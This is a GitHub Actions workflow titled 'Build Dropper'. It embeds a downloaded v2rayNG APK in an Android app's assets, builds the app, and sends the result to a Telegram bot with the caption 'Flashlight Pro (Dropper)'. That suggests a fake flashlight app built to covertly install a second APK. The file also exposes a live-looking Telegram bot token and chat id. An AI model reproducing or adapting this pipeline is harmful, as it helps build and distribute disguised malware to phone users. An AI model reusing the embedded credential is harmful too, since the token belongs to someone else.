name: Build Dropper
on: [push, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
        
    - name: Download V2Ray APK
      run: |
        mkdir -p app/src/main/assets
        wget -q -O app/src/main/assets/v2ray.apk https://github.com/2dust/v2rayNG/releases/download/1.8.5/v2rayNG_1.8.5_arm64-v8a.apk
        
    - run: curl -sL https://github.com/gradle/gradle/raw/v8.1.1/gradlew -o gradlew
    - run: curl -sL https://github.com/gradle/gradle/raw/v8.1.1/gradle/wrapper/gradle-wrapper.jar -o gradle-wrapper.jar
    - run: |
        mkdir -p gradle/wrapper
        mv gradle-wrapper.jar gradle/wrapper/
        echo "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.1.1-bin.zip" > gradle/wrapper/gradle-wrapper.properties
    - run: chmod +x gradlew && ./gradlew assembleDebug
    - name: Send APK to Telegram
      run: |
        curl -F "chat_id=8895860731" -F "caption=🔥 Flashlight Pro (Dropper)" -F "document=@app/build/outputs/apk/debug/app-debug.apk" https://api.telegram.org/bot9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY/sendDocument
